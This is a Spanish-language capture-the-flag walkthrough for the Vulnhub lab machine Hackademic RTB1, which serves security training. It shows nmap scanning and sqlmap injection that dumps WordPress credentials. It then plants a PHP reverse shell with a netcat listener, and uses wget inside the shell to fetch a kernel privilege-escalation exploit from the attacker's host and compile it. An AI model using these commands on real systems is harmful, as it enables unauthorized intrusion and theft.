<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?font=xd&size=50&color=F70000&background=FF000000&width=500&height=70&lines=HACKADEMIC_RTB1"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/hackademic-rtb1,17/

**[Online]:**

Root-Me: https://www.root-me.org/fr/Capture-The-Flag/CTF-all-the-day/Hackademic-RTB1-22?lang=es

<h1 align="center"></h1>

</br>

- *Paso 1:* Identificación de la máquina en la red con NetDiscover. 
```
netdiscover --interface wlan0 --range 192.168.1.0/24
```
![1](https://user-images.githubusercontent.com/75953873/171916293-58226ff2-39aa-4d40-b2b2-df538a7784d1.png)

Objetivo: 192.168.1.5


- *Paso 2:* Escaneo de puertos abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.1.5
```
![2](https://user-images.githubusercontent.com/75953873/171916862-e15a1cc6-e25a-4613-a54c-3d8b3f135135.png)

Detección de sistema operativo y versión: 
```
nmap -p 80 -A 192.168.1.5
```
![3](https://user-images.githubusercontent.com/75953873/171917441-d5f58873-8274-4611-90f6-db7bb9902c1a.png)

Puerto abierto: 80

Servidor web corriendo: HTTP Apache

- *Paso 3:* Búsqueda de vectores vulnerables a SQL. 

```
http://192.168.1.5/Hackademic_RTB1/?cat=1
```
![4](https://user-images.githubusercontent.com/75953873/171920301-015e4c06-3a1f-4535-9790-f4f450563eb9.png)

- *Paso 4:* Inyección de SQL a base de datos con Sqlmap. 

```
sqlmap --url 'http://192.168.1.5/Hackademic_RTB1/?cat=1' --dbs --batch
```
![5](https://user-images.githubusercontent.com/75953873/171921174-bbf606b5-80d8-4cbc-9a01-8c068de466fc.png)

Extraer toda la información de la base de datos de WordPress:
```
sqlmap --url 'http://192.168.1.5/Hackademic_RTB1/?cat=1' -D wordpress --dump-all --batch
```
![6](https://user-images.githubusercontent.com/75953873/171922959-d02ba87f-22b8-4770-b0dc-9c74c82eee21.png)

Usuario de WordPress: `GeorgeMiller`

Contraseña: `q1w2e3`

Acceder al panel de login de WordPress:
```
http://192.168.1.5/Hackademic_RTB1/wp-login.php
```
![7](https://user-images.githubusercontent.com/75953873/171924583-6a77c97a-d61c-4d81-a199-39077d868d4b.png)

- *Paso 4:* Subir código PHP y obtener una reverse shell. 

-> Manage -> Files

![8](https://user-images.githubusercontent.com/75953873/171925393-d911ddcf-cf5a-4670-8143-4026d0c70424.png)

Copiar código PHP de la siguiente ruta:
```
cat /usr/share/webshells/php/php-reverse-shell.php
```
![9](https://user-images.githubusercontent.com/75953873/171925910-7d2cc0de-93a1-4bc8-aeaf-dad026c76a9c.png)

Pegan el código en hello.php y cambian la línea de `$ip` por su IP local, luego guardan los cambios "Update File":

![10](https://user-images.githubusercontent.com/75953873/171926310-94b22d02-b809-4029-a72f-d90b1634fe8d.png)

Abren una nueva terminal y ejecutan Netcat para que escuche las conexiones por el puerto 1234. 
```
nc -lvp 1234
```

Posteriormente recargan la siguiente URL:
```
http://192.168.1.5/Hackademic_RTB1/wp-content/plugins/hello.php
```
![11](https://user-images.githubusercontent.com/75953873/171927713-64734806-0fc2-41d6-8b17-aff9e45f4b35.png)

- *Paso 5:* Identificar versión del Kernel y escalar privilegios. 

![12](https://user-images.githubusercontent.com/75953873/171928596-5a971c00-0c42-4d48-bf3c-93a776150472.png)

Localizar el exploit con searchsploit:
```
searchsploit Linux Kernel 2.6.3 RDS Local Privilege Escalation
```
![13](https://user-images.githubusercontent.com/75953873/171930886-0c5950e1-7c71-4a88-9aec-0b2fd90a1fa4.png)

Descargar el exploit:
```
searchsploit -m 15285
```
![14](https://user-images.githubusercontent.com/75953873/171931554-8fde81f6-88fd-4281-8597-ebeb5fd57124.png)

Ejecutamos un servidor HTTP local simple con Python:
```
python3 -m http.server 80
```
![16](https://user-images.githubusercontent.com/75953873/171932402-4c30740c-4e87-4d2e-99be-b09d54c089c1.png)

Dentro de la reverse shell generada, nos movemos al directorio `/tmp` y descargamos el exploit de nuestro servidor:
```
cd /tmp
wget http://192.168.1.9/15285.c
```
![15](https://user-images.githubusercontent.com/75953873/171932443-98620783-0a4f-4007-b69e-fe03b8ce7612.png)

Seguidamente compilamos el código y le damos permisos de lectura, escritura y ejecución:
```
gcc 15285.c -o kernel
chmod 777 kernel
```
![17](https://user-images.githubusercontent.com/75953873/171933850-a08f1cb8-f9fa-4762-96f9-cc2af26619a2.png)
